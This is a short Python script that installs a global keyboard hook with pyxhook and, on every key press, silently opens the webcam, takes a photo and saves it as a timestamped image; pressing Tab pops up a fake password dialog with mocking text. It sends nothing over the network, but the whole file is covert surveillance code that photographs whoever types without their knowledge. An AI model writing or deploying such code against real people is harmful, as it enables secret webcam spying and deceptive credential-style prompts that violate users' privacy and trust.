import cv2
import calendar;
import time;
import pyxhook
import pyautogui

def OnKeyPress(event):

    time_stamp = calendar.timegm(time.gmtime())

    video_capture = cv2.VideoCapture(0)
    if not video_capture.isOpened():
        raise Exception("Could not open video device")
    # Read picture. ret === True on success
    ret, frame = video_capture.read()
    cv2.imwrite(str(time_stamp) + '.png',frame)
    # Close device
    video_capture.release()
    
    if event.Ascii==27: #27 is the ascii value of ESC key
        new_hook.cancel()
    if event.Ascii==9: #tab key
        pyautogui.password(text='Somriu :)', title='HOLA QUE ASE', default='hahaha xD', mask='')

#instantiate HookManager class
new_hook=pyxhook.HookManager()
#listen to all keystrokes
new_hook.KeyDown=OnKeyPress
#hook the keyboard
new_hook.HookKeyboard()
#start the session
new_hook.start()

